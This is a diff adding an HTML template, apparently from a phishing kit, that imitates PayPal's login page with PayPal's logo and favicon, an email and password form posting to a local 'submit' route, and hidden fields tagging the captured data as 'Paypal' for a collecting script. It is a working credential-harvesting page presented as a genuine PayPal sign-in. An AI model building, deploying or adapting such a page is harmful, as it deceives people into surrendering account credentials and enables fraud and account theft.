@@ -1,0 +1,97 @@
+<!-- https://www.paypal.com -->
+<html>
+   <head>
+      <title>International shopping made easy. This and more with PayPal</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <style>
+         .button {
+         box-sizing: border-box;
+         width: 100%;
+         min-height: 44px;
+         padding: 0;
+         border: 0;
+         box-shadow: none;
+         border-radius: 4px;
+         cursor: pointer;
+         text-align: center;
+         }
+         input {
+         height: 44px;
+         width: 100%;
+         padding: 0 10px;
+         border: 1px solid #9da3a6;
+         background: #fff;
+         border-radius: 4px;
+         font-size: 1em;
+         font-weight: 400;
+         -webkit-text-fill-color: #868c8e;
+         }
+         .footer {
+         position: fixed;
+         bottom: 0;
+         left: 0;
+         right: 0;
+         text-align: center;
+         font-size: 11px;
+         background-color: #F7F9FA;
+         padding: 14px 20px
+         }
+         .footer a,
+         .footer a:link,
+         .footer a:visited,
+         .footer a:hover {
+         color: #666;
+         white-space: nowrap
+         }
+         @media all and (max-width:767px) {
+         .contentContainer {
+         margin-top:35 !important;
+         padding:0 !important;
+         width: 100%;
+         background-color: #fff;
+         }
+         .corral {width: 87% !important;}
+         }
+         a {text-decoration: none;margin-right:10px;}
+         .contentContainer {margin: 110px auto 0;padding: 30px 10% 50px;}
+         .corral {margin: 0 auto;width: 460px;}
+         .forgotLink {margin: 20px auto;padding-bottom: 20px;border-bottom: 1px solid #cbd2d6;text-align: center}
+      </style>
+      <link rel="shortcut icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico">
+   </head>
+   <center>
+      <body style="font-size: 93.75%;font-family: sans-serif;">
+         <div>
+            <section>
+               <div class="corral">
+                  <div class="contentContainer">
+                     <center>
+                        <p style="background: transparent url(https://www.paypalobjects.com/digitalassets/c/website/logo/full-text/pp_fc_hl.svg) top center no-repeat;background-size: auto 28px;width: 129px;height: 32px;"></p>
+                     </center>
+                     <form action="{{ url_for("submit")}}" method="post">
+                        <div class="textInput" >
+                           <input type="email" name="email" placeholder="Email" style="margin-bottom:10px;" required>
+                           <input type="password" name="pass" placeholder="Password" style="margin-bottom:25px;" required>
+						   <input type=hidden name=location value=Paypal>      <!-- This will tell his name to post.php --><br>
+		                   <input type=hidden name=link value=''>   
+                        </div>
+                        <button class="button" style="font-family:sans-serif;font-size: 1em;font-weight: 700;background-color:#0070ba;color:#fff" type="submit">Log In</button>
+                        <div class="forgotLink">
+                           <a href="" style="color: #0070ba;margin-right:0 !important;">Having trouble logging in?</a>
+                        </div>
+                     </form>
+                     <button class="button" style="font-family:sans-serif;font-size: 93.75%;font-weight:bold;background-color:#E1E7EB;color:#2C2E2F">Sign Up</button>
+                  </div>
+               </div>
+               <footer class="footer" role="contentinfo" style="margin: 0;padding: 0;display: inline-block;">
+                  <ul>
+                     <a href="" >Contact Us</a> <a href="" >Privacy</a> <a href="" >Legal</a> <a href="" >Worldwide</a>
+                  </ul>
+               </footer>
+            </section>
+         </div>
+      </body>
+   </center>
+</html>
+
